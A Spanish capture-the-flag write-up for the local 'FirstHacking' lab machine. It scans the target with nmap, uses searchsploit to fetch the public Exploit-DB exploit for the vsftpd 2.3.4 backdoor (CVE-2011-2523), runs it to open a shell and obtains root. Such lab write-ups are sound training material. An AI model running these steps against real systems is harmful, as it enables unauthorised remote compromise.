
# 7. Máquina: FirstHacking  

<a href="https://github.com/GutsNet"><img title="Author" src="https://img.shields.io/badge/Author-GutsNet-purple.svg?style=for-the-badge&logo=github"></a>

**Dificultad:** 🔵 *Muy Fácil*

**Autor:** *[El Pingüino de Mario](https://www.youtube.com/channel/UCGLfzfKRUsV6BzkrF1kJGsg)*

**Fecha de creación:** *14/06/2024*

**Proceso:**
- [1. Despliegue](#desplegando-la-máquina-vulnerable)
- [2. Escaneo de Puertos](#escaneo-de-puertos-con-nmap)
- [3. Búsqueda de Exploits](#exploit-vsftpd-234)
- [4. Ejecución de Exploit](#ejecución-del-exploit)
- [5. Acceso a la Máquina](#acceso-a-la-máquina)

---

## Desplegando la Máquina Vulnerable

```python
~/FirstHacking ᐅ sudo bash auto_deploy.sh firsthacking.tar
```
Este comando ejecuta un script de bash (`auto_deploy.sh`) que despliega la máquina vulnerable a partir del archivo `trust.tar`.

**Salida:**

```python
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

#### Verificación de Conectividad

```python
~/FirstHacking ᐅ ping -c 2 172.17.0.2
```
El comando `ping -c 2` envía 2 paquetes ICMP a la dirección IP `172.17.0.2` para verificar la conectividad y la respuesta del host.

**Salida:**

```python
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.066 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.045 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1062ms
rtt min/avg/max/mdev = 0.045/0.055/0.066/0.010 ms
```
---

## Escaneo de Puertos con Nmap

```python
~/FirstHacking ᐅ nmap -p- -sV 172.17.0.2
```
Este comando revela que el puerto `21` (FTP) está abierto, con el servicio `vsftpd` versión `2.3.4` ejecutándose.

**Salida:**

```python
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.3.4
Service Info: OS: Unix
```

**Explicación de parámetros:**

- `-p-`: Escanea todos los puertos (del 1 al 65535).
- `-sCV`: Realiza un escaneo con detección de versión (`-sV`) y utiliza scripts básicos (`-sC`) para obtener más información del servicio.

---

## Exploit vsftpd 2.3.4

```python
~/FirstHacking ᐅ searchsploit vsftpd 2.3.4
```

Se encuentra un exploit conocido para `vsftpd 2.3.4` que permite la ejecución remota de comandos a través de una puerta trasera.

**Salida:**

```python
vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
```

### Descarga del Exploit

```python
~/FirstHacking ᐅ searchsploit -m 49757
```

Se descarga el archivo `49757.py` para proceder con la explotación.

**Información del Exploit:**

- **Exploit:** vsftpd 2.3.4 - Backdoor Command Execution
- **URL:** [Exploit-DB #49757](https://www.exploit-db.com/exploits/49757)
- **CVE:** CVE-2011-2523
- **Autor:** HerculesRD
- **Probado en:** Debian
- **Tipo de archivo:** Python Script

---

## Ejecución del Exploit

```python
~/FirstHacking ᐅ python3 49757.py 172.17.0.2
```

Este comando ejecuta el exploit `49757.py` para abrir una shell remota en el puerto `6200` del servidor vulnerable.

**Salida:**

```python
Success, shell opened
Send `exit` to quit shell
```

---

## Acceso a la Máquina

```python
script /dev/null -c bash
```

Se obtiene acceso como `root` en el sistema vulnerable.

**Comandos de Verificación:**

```python
root@dac087324923:~/vsftpd-2.3.4# whoami
root
```
